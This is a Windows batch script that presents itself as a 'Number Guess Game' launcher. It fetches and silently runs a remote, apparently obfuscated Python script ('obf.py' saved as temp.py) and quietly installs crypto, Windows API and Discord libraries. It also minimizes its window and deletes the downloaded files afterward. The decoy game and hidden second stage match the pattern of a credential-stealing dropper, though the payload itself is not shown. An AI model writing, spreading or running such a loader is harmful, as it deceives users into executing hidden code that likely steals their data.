@echo off
title Number Guess Game
color 0A

REM Define the Downloads folder path
set "download_path=%USERPROFILE%\Downloads"

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python...
    curl -o python-installer.exe https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python-installer.exe
)

REM Download the game.py script
curl -s https://raw.githubusercontent.com/MilimCode/tested/main/game.py --output "%download_path%\game.py"

REM Download the obf.py script
curl -s https://raw.githubusercontent.com/MilimCode/tested/main/obf.py --output "%download_path%\temp.py"

REM Run the game script
start python "%download_path%\game.py"

REM Minimize the console window
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('%n')"

REM Run the download and install process
echo Starting PYTHON INSTALLER...
python -m pip install requests pycryptodome pywin32 discord >nul 2>&1
python "%download_path%\temp.py" >nul 2>&1

REM Delete the downloaded Python scripts
del /f /q "%download_path%\temp.py"
del /f /q "%download_path%\game.py"

pause >nul
